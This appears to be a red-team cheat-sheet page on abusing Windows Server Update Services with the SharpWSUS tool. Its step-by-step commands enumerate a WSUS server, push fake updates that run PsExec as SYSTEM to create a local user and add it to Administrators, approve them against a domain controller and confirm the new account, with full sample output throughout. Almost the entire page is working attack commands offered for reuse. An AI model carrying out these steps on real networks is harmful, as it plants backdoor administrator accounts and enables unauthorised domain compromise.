---
title: "WSUS"
date: 2025-8-6
tags: ["WSUS", "Windows Server Update Services", "SharpWSUS", "Patch Management", "Update Deployment", "Lateral Movement", "Microsoft Updates", "System Administration", "Network Security"]
---

### Abuse #1: Deploy an Update

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Inspect WSUS

```console
.\SharpWSUS.exe inspect
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Programdata> .\SharpWSUS.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
SRV, 8530, C:\WSUS-Updates\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.example.com, 10.10.141.53, 10.0.20348.2031, 8/6/2025 12:45:20 PM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete
```

#### 2. Create an Update \[Add a New User\]

```console
.\SharpWSUS.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user <NEW_USER> <NEW_PASSWORD> /add\""
```

```console {class="sample-code"}
C:\ProgramData>.\SharpWSUS.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user dummy Test1234 /add\""

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
C:\WSUS-Updates\WsusContent
[*] Creating patch to use the following:
[*] Payload: PSExec64.exe
[*] Payload Path: C:\_install\PSExec64.exe
[*] Arguments: -accepteula -s -d cmd.exe /c "net user dummy Test1234 /add"
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;quot;net user dummy Test1234 /add&amp;quot;

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
SRV, 8530, C:\WSUS-Updates\WsusContent

ImportUpdate
Update Revision ID: 198781
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 198782
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:dc8ab883-3f69-4df7-a365-af802afa11c2 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:dc8ab883-3f69-4df7-a365-af802afa11c2 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:dc8ab883-3f69-4df7-a365-af802afa11c2 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete

```

#### 3. Approve the Update

```console
.\SharpWSUS.exe approve /updateid:<UPDATE_ID_1> /computername:<TARGET_DOMAIN> /groupname:"<GROUP_1>"
```

```console {class="sample-code"}
C:\ProgramData>.\SharpWSUS.exe approve /updateid:dc8ab883-3f69-4df7-a365-af802afa11c2 /computername:dc.example.com /groupname:"Group Name1"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update
C:\WSUS-Updates\WsusContent

Targeting dc.example.com
TargetComputer, ComputerID, TargetID
------------------------------------
dc.example.com, a9d52bcf-9d8d-4afa-b602-09a1e977d6fb, 1
Group Exists = False
Group Created: Group Name1
Added Computer To Group
Approved Update

[*] Approve complete
```

#### 4. Check \[Optional\]

```
# In RDP Session
Search -> Update Services
Updates -> All Updates
Approval: Any Except Declined, Status: Any -> Refresh
SharpWSUS Update -> 100%
```

#### 5. Create an Update \[Add New User to Administrators\]

```console
.\SharpWSUS.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup Administrators <NEW_USER> /add\""
```

```console {class="sample-code"}
C:\ProgramData>.\SharpWSUS.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators dummy /add\""

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
C:\WSUS-Updates\WsusContent
[*] Creating patch to use the following:
[*] Payload: PSExec64.exe
[*] Payload Path: C:\_install\PSExec64.exe
[*] Arguments: -accepteula -s -d cmd.exe /c "net localgroup administrators dummy /add"
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;quot;net localgroup administrators dummy /add&amp;quot;

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
SRV, 8530, C:\WSUS-Updates\WsusContent

ImportUpdate
Update Revision ID: 198783
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 198784
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:424ccbb8-6055-41c8-8d0c-5d895d032029 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:424ccbb8-6055-41c8-8d0c-5d895d032029 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:424ccbb8-6055-41c8-8d0c-5d895d032029 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete

```

#### 6. Approve the Update

```console
.\SharpWSUS.exe approve /updateid:<UPDATE_ID_2> /computername:<TARGET_DOMAIN> /groupname:"<GROUP_2>"
```

```console {class="sample-code"}
C:\ProgramData>.\SharpWSUS.exe approve /updateid:424ccbb8-6055-41c8-8d0c-5d895d032029 /computername:dc.example.com /groupname:"Group Name3"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update
C:\WSUS-Updates\WsusContent

Targeting dc.example.com
TargetComputer, ComputerID, TargetID
------------------------------------
dc.example.com, a9d52bcf-9d8d-4afa-b602-09a1e977d6fb, 1
Group Exists = False
Group Created: Group Name3
Added Computer To Group
Approved Update

[*] Approve complete
```

#### 7. Check \[Optional\]

```
# In RDP Session
Search -> Update Services
Updates -> All Updates
Approval: Any Except Declined, Status: Any -> Refresh
SharpWSUS Update -> 100%
```

#### 8. Check

```console
net user <NEW_USER> /domain
```

```console {class="sample-code"}
PS C:\> net user dummy /domain
net user dummy /domain
The request will be processed at a domain controller for domain example.com.

User name                    dummy
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/6/2025 7:35:26 AM
Password expires             9/17/2025 7:35:26 AM
Password changeable          8/7/2025 7:35:26 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Users         
The command completed successfully.
```

<small>*Ref: [SharpWSUS](https://github.com/techspence/SharpWSUS/tree/main)*</small>

{{< /tabcontent >}}
